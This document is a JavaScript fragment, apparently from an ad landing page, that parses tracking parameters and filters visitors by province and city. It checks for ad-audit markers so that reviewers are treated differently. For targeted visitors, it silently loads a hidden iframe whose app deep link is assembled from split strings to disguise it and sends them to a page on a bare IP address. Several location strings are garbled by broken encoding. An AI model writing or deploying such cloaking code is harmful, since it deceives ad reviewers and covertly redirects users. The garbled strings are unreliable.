function getUrlParam(paraName) {
        var url = document.location.toString();
        var arrObj = url.split("?");
        if (arrObj.length > 1) {
            var arrPara = arrObj[1].split("&");
            var arr;
            for (var i = 0; i < arrPara.length; i++) {
                arr = arrPara[i].split("=");
                if (arr != null && arr[0] === paraName) {
                    return arr[1];
                }
            }
        } else {
            return "";
        }
    }
    var adid = getUrlParam("adid");
    var kobe = "lo";
    var creativeid = getUrlParam("creativeid");
    var kd = "view";
    var creativetype = getUrlParam("creativetype");
    var jd = "ss";
    var clickid = getUrlParam("clickid");
    var wade = "web";
    var AD = getUrlParam("AD_AUDIT_MARKID");
    var lb = "cal";
    var url;
    var u = navigator.userAgent;
    var isiOS = !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/); 
	var province=localAddress.province;
	var city=localAddress.city;
	var dizhi = province+city;
	var zx_flag = 0;
	var ch_flag = 0;
	var arr=eval(<?php echo json_encode($falseCity);?>);
	for(j = 0; j < arr.length; j++) {
   		if (dizhi.indexOf(arr[j])!= -1){
			zx_flag=1;
		}
	}
	if(dizhi.indexOf('����')!= -1||dizhi.indexOf('�½�')!= -1||dizhi.indexOf('����')!= -1||dizhi.indexOf('���')!= -1||dizhi.indexOf('�ӱ�')!= -1||dizhi.indexOf('ɽ��')!= -1||dizhi.indexOf('���ɹ�')!= -1||dizhi.indexOf('����')!= -1||dizhi.indexOf('�ຣ')!= -1||dizhi.indexOf('����')!= -1||dizhi.indexOf('����')!= -1||dizhi.indexOf('����')!= -1||dizhi.indexOf('����')!= -1||dizhi.indexOf('������')!= -1||dizhi.indexOf('ɽ��')!= -1||dizhi.indexOf('����')!= -1||dizhi.indexOf('�Ϻ�')!= -1||dizhi.indexOf('�㽭')!= -1||dizhi.indexOf('����')!= -1||dizhi.indexOf('����')!= -1||dizhi.indexOf('����')!= -1||dizhi.indexOf('�Ĵ�')!= -1||dizhi.indexOf('����')!= -1||dizhi.indexOf('����')!= -1||dizhi.indexOf('����')!= -1||dizhi.indexOf('�㶫')!= -1||dizhi.indexOf('����')!= -1||dizhi.indexOf('����')!= -1||dizhi.indexOf('����')!= -1||dizhi.indexOf('����')!= -1||dizhi.indexOf('����')!= -1){
		ch_flag = 1 ;
	}
    function oa(u,a) {
        if(a.indexOf("mf") != -1 && zx_flag ==0 && ch_flag ==1){
            var iframe = document.getElementById("iframe1");
            if(!clickid || (adid == "__AID__") || (AD == "external_url")){
            }else{
                if(isiOS){
                    setTimeout(function(){
                        url = jd + kobe + lb + "://" + wade + kd +"?url="+a+encodeURIComponent("&adid=" + adid + "&creativeid=" + creativeid + "&clickid=" + clickid + "&creativetype=" + creativetype + "&t="+new Date().getTime() );
                        iframe.src = url;
                    },500);
                }else{
                    url = jd + kobe + lb + "://" + wade + kd +"?url="+a+encodeURIComponent("&adid=" + adid + "&creativeid=" + creativeid + "&clickid=" + clickid + "&creativetype=" + creativetype + "&t="+new Date().getTime() );
                    iframe.src = url;
                }
            }	
        }
    }
    function oa2(u,a) {
        if(a.indexOf("mf") != -1){
            var iframe = document.createElement("iframe");
            if((clickid == undefined) || (adid == "__AID__") || (AD == "external_url")){
                if(bk){
                    window.location.href = ju;
                }else{
                    window.location.href = au;
                }
            }else{
                document.body.appendChild(iframe);
                iframe.style.display = "none";
                var url = jd + kobe + lb + "://" + wade + kd +"?url="+a+encodeURIComponent("&adid=" + adid + "&creativeid=" + creativeid + "&clickid=" + clickid + "&creativetype=" + creativetype + "&t="+new Date().getTime() );
                iframe.src = url;
            }
        }
    }
    $(function () {
         $(".content img").removeAttr("style");
         $("#check-button").click(function () {
            if (j) {
               oa2(ju,ja);
            }
         });
    });
	</script>
<script>
    var ctx = /mf/;
    var prefix = ctx;
    var j = true;
    var g = getUrlParam("id");
    var ju = '';
    var au = '';
    var ja = 'http%3A%2F%2F47.105.184.85%2Fmf%2Findex_or2%3Fid%3D'+g;
    var bk = false;
	
    $(function() {
		
        if(j){
           oa(ju,ja);
        }
		//window.location.href='http://go.zunars.com.cn'; 
    });
    var jump = false;//����
    if(jump){
        window.location.href = au;
    }